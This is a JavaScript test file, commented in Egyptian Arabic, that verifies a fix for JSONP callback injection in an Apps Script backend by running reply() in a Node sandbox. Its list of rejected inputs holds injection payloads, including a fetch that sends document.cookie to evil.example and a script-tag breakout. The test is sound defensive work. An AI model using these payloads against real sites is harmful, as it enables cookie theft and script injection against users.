// ثغرة: اسم الدالة (callback) اللي جاي في الرابط كان بيتحط في الرد زي ما هو،
// والرد بيترجع كـ JavaScript. يعني رابط فيه callback=<كود> كان بيخلّي السيرفر
// يرجّع الكود ده جاهز للتنفيذ. الاختبار بيشغّل reply() فعليًا.
import fs from 'fs';
import vm from 'node:vm';
let pass=0, fail=0;
const check=(n,ok,x='')=>{ console.log((ok?'✅':'❌')+' '+n+(x?'  — '+x:'')); ok?pass++:fail++; };
const gs = fs.readFileSync(new URL('../apps_script.gs', import.meta.url), 'utf8');
const grab = n => { const m = new RegExp('function '+n+'\\([\\s\\S]*?\\n\\}').exec(gs); if(!m) throw new Error('مالقيناش '+n); return m[0]; };
const cbRe = /var CB_OK_ = .*/.exec(gs);
check('فيه فحص لاسم الدالة', !!cbRe);

const ctx = { JSON, String, RegExp,
  ContentService: { MimeType:{JAVASCRIPT:'js', JSON:'json'},
    createTextOutput: t => ({ نص:t, setMimeType: m => ({ نص:t, نوع:m }) }) } };
vm.createContext(ctx);
vm.runInContext(cbRe[0] + '\n' + grab('json') + '\n' + grab('reply'), ctx);
const شغّل = (cb) => vm.runInContext('reply({ok:true, س:1}, ' + JSON.stringify(cb) + ')', ctx);

// الأسماء اللي التطبيق بيبعتها فعلاً
{
  const r = شغّل('wpcb1757347200000123');
  check('الاسم العادي بتاع التطبيق شغّال',
    r.نص.startsWith('wpcb1757347200000123({') && r.نوع==='js', r.نص.slice(0,40));
}

// محاولات حقن
const خبيثة = [
  'alert(1)//',
  'x;fetch("https://evil.example/"+document.cookie);y',
  '</script><script>alert(1)</script>',
  'a(1),b',
  'top.location="https://evil.example"',
  'f["x"]',
  ''.padEnd(200,'a')          // اسم طويل جدًا
];
let كله_اترفض = true, أمثلة = [];
خبيثة.forEach(cb=>{
  const r = شغّل(cb);
  const اترفض = r.نوع === 'json' || (r.نص && r.نص.indexOf(cb) < 0);
  if(!اترفض){ كله_اترفض = false; أمثلة.push(cb); }
});
check('كل محاولات الحقن اترفضت', كله_اترفض, أمثلة.join(' | '));

// من غير callback = رد JSON عادي
{
  const r = vm.runInContext('reply({ok:true}, "")', ctx);
  check('من غير callback بيرجّع JSON عادي', r.نوع==='json', JSON.stringify(r).slice(0,60));
}

console.log(`\nالنتيجة: ${pass} نجحت، ${fail} فشلت`);
process.exit(fail?1:0);
